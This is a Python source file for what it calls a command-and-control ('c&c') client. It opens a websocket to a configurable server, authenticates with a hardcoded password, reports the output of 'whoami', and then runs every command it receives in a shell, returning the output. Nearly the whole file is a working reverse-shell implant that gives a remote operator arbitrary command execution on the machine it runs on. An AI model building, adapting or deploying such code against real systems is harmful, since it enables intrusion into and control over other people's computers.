import subprocess
import os

import click
import asyncio
import websockets

from utils import hash_sha256


def execute_command(cmd: str):
    try:
        splitted = cmd.strip("\n").split(" ")
        if len(splitted) == 2 and splitted[0] == "cd":
            os.chdir(splitted[1])
        else:
            output = subprocess.run(cmd, check=True, text=True, shell=True,
                                    capture_output=True)
            return output.stdout
    except subprocess.CalledProcessError:
        pass
    return ""


async def connect(uri: str, password: str):
    pass_hash = hash_sha256(password)

    try:
        async with websockets.connect(uri) as ws:
            await ws.send(pass_hash)
            await ws.send(execute_command("whoami"))

            while True:
                cmd = await ws.recv()
                await ws.send(execute_command(cmd))
    except Exception as e:
        print(f"Exception {e} occurred.")


@click.command()
@click.option(
    "--server_address",
    "-s",
    default="127.0.0.1",
    type=click.STRING,
    help="Ip address or host of a running c&c",
)
@click.option(
    "--port",
    "-p",
    default="6777",
    type=click.INT,
    help="Port where the running c&c listens",
)
def main(server_address: str, port: int):
    password = "password"
    uri = f"ws://{server_address}:{port}"

    print("Starting client...")
    asyncio.get_event_loop().run_until_complete(connect(uri, password))


if __name__ == "__main__":
    main()
